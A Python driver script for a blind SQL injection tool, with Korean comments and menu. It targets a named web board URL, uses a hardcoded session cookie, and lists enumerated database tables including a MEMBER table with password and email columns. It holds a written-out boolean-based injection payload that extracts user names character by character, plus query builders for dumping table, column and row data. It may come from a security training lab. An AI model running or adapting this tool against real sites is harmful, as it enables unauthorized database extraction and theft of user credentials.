from attack_setting import attackData,tableInfo
from attack_query import *
from binary_search import binary_search,letter_search
from get_infos import *

#공격 대상 URL 및 초기 쿠키 설정 
url = "http://elms1.skinfosec.co.kr:8082/community6/free"
cookies = {
    "JSESSIONID":"6E2650EBA3AE99141993E9130A7E1054"
}


attack_query = ''
page = attackData()
query = attackQuerys()
page.set_url(url)
page.set_cookies(cookies)

result = tableInfo()
result.tables=['BOARD', 'COMM_FILE', 'COMM_MDI_FILE', 'MEMBER', 'ZIPCODE', 'ANSWER']
result.columns={'BOARD': ['BOARD_ID', 'TITLE', 'CONTENT', 'VIEW_COUNT', 'REG_ACCT_ID', 'DEL_FL', 'REG_DT', 'UDT_ACCT_ID', 'UDT_DT', 'BOARD_TYPE_CD'], 'COMM_FILE': ['FILE_ID', 'FILE_NM', 'FILE_PATH', 'ORG_FILE_NM', 'FILE_SIZE', 'FILE_TYPE_CD', 'REG_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID'], 'COMM_MDI_FILE': ['MDI_FILE_ID', 'FILE_ID', 'MDI_TYPE_CD', 'MDI_ORDER', 'REG_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID', 'BOARD_ID'], 'MEMBER': ['ACCT_ID', 'LOGIN_ID', 'USER_NM', 'USER_TERMS_YN', 'PRIVACY_YN', 'EMAIL', 'PASS', 'ZIPCODE', 'ADDRESS1', 'ADDRESS2', 'REG_ACCT_ID', 'REG_DT', 'UDT_ACCT_ID', 'UDT_DT', 'MAIL_CERTI_KEY', 'CERTI_YN', 'ADMIN_YN', 'PWDQ', 'PWDANS', 'PWDCNT', 'FSTPWD'], 'ZIPCODE': ['ZIPCODE', 'SIDO', 'GUGUN', 'DONG', 'BUNJI'], 'ANSWER': ['ANSWER', 'REG_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID']}
result.datas={'BOARD': {'BOARD_ID': [], 'TITLE': [], 'CONTENT': [], 'VIEW_COUNT': [], 'REG_ACCT_ID': [], 'DEL_FL': [], 'REG_DT': [], 'UDT_ACCT_ID': [], 'UDT_DT': [], 'BOARD_TYPE_CD': []}, 'COMM_FILE': {'FILE_ID': [], 'FILE_NM': [], 'FILE_PATH': [], 'ORG_FILE_NM': [], 'FILE_SIZE': [], 'FILE_TYPE_CD': [], 'REG_DT': [], 'REG_ACCT_ID': [], 'UDT_DT': [], 'UDT_ACCT_ID': []}, 'COMM_MDI_FILE': {'MDI_FILE_ID': [], 'FILE_ID': [], 'MDI_TYPE_CD': [], 'MDI_ORDER': [], 'REG_DT': [], 'REG_ACCT_ID': [], 'UDT_DT': [], 'UDT_ACCT_ID': [], 'BOARD_ID': []}, 'MEMBER': {'ACCT_ID': [], 'LOGIN_ID': [], 'USER_NM': [], 'USER_TERMS_YN': [], 'PRIVACY_YN': [], 'EMAIL': [], 'PASS': [], 'ZIPCODE': [], 'ADDRESS1': [], 'ADDRESS2': [], 'REG_ACCT_ID': [], 'REG_DT': [], 'UDT_ACCT_ID': [], 'UDT_DT': [], 'MAIL_CERTI_KEY': [], 'CERTI_YN': [], 'ADMIN_YN': [], 'PWDQ': [], 'PWDANS': [], 'PWDCNT': [], 'FSTPWD': []}, 'ZIPCODE': {'ZIPCODE': [], 'SIDO': [], 'GUGUN': [], 'DONG': [], 'BUNJI': []}, 'ANSWER': {'ANSWER': ['ant6'], 'REG_DT': ['03-JUL-19'], 'REG_ACCT_ID': ['U180623-00001'], 'UDT_DT': ['03-JUL-19'], 'UDT_ACCT_ID': ['U180623-00001']}}




#쿼리 설정 및 요청 보내기(POST)
#print(page.send_post_request(request_string="%test' and (select ascii(substr(USER_NM,1,1)) from (select USER_NM, rownum as rnum from MEMBER) where rnum=1)>128 and '1%'='1"))

#기본 설정 보기 
#page.show

#쿼리 테스트
table_count_query = query.get_table_query('count')
table_length_query = query.get_table_query('length',rnum=1)
table_data_query = query.get_table_query('data',rnum=1)

column_count_query = query.get_column_query('count',table_name='MEMBER')
column_length_query = query.get_column_query('length',table_name='ANSWER',rnum=1)
column_data_query = query.get_column_query('data',table_name='ANSWER',rnum=1)

data_count_query = query.get_data_query('count',table_name='ANSWER',column_name='ANSWER')
data_length_query = query.get_data_query('length',table_name='ANSWER',column_name='ANSWER',rnum=1)
data_query = query.get_data_query('data',table_name='ANSWER',column_name='ANSWER',rnum=1)

#print(data_query)
#binary_search(page,column_count_query)
#letter_search(page,data_query,4)

print("main 시작")
#tables = get_table_infos(page)
#get_column_infos(page,result,'ANSWER')
#get_table_data(page,result,'ANSWER')

state=""
while(state != 'q'):

    print("\n기능 목록")
    print('-'*20)
    print("1. 사이트 URL 설정")
    print("2. 사이트 SessionID 설정")
    print("3. 특정 쿼리 보내기")
    print("4. 테이블 탐색")
    print("5. 컬럼 탐색")
    print("6. 테이블 내 데이터 탐색")
    print("7. 테이블 정보 출력")
    print("8. 컬럼 정보 출력")
    print("9. 데이터 정보 출력")
    print('-'*20)

    user_input = input("원하는 명령의 숫자를 입력 : ")
    state= input("계속 실행을 원하시면 엔터를 눌러주세요... (exit=q)")

print("프로그램 종료")